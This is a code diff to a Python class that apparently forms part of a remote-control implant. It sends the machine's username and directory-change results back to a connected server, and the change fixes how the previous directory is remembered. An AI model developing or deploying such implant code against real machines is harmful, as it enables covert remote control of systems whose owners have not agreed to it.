@@ -64,6 +64,10 @@ class magic_unicorn:
         self.handler = handler(server)
         self.custom = custom()
         self.badges = badges()
+        
+        self.main_directory = os.getcwd()
+        self.home_directory = str(pathlib.Path.home())
+        self.temp_directory = ""
 
     def command_username(self):
         self.handler.send(getpass.getuser().encode("UTF-8"))
@@ -180,30 +184,27 @@ class magic_unicorn:
         self.handler.send("".encode("UTF-8"))
 
     def command_chdir(self, cmd_data):
-        main_directory = os.getcwd()
-        home_directory = str(pathlib.Path.home())
-        temp_directory = ""
         if cmd_data == "-":
-            if not temp_directory:
+            if not self.temp_directory:
                 self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
             else:
                 temp_directory_2 = os.getcwd()
-                os.chdir(temp_directory)
-                self.handler.send((self.badges.I + "Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
-                temp_directory = temp_directory_2
+                os.chdir(self.temp_directory)
+                self.handler.send((self.badges.I + "Changed to directory {}.".format(self.temp_directory)).encode("UTF-8"))
+                self.temp_directory = temp_directory_2
         elif cmd_data == "!":
-            temp_directory = os.getcwd()
-            os.chdir(main_directory)
-            self.handler.send((self.badges.I + "Changed to directory {}.".format(main_directory)).encode("UTF-8"))
+            self.temp_directory = os.getcwd()
+            os.chdir(self.main_directory)
+            self.handler.send((self.badges.I + "Changed to directory {}.".format(self.main_directory)).encode("UTF-8"))
         elif cmd_data == "~":
-            temp_directory = os.getcwd()
-            os.chdir(home_directory)
-            self.handler.send((self.badges.I + "Changed to directory {}.".format(home_directory)).encode("UTF-8"))
+            self.temp_directory = os.getcwd()
+            os.chdir(self.home_directory)
+            self.handler.send((self.badges.I + "Changed to directory {}.".format(self.home_directory)).encode("UTF-8"))
         else:
             if not os.path.isdir(cmd_data):
                 self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
             else:
-                temp_directory = os.getcwd()
+                self.temp_directory = os.getcwd()
                 os.chdir(cmd_data)
                 self.handler.send((self.badges.I + "Changed to directory {}.".format(cmd_data)).encode("UTF-8"))
 
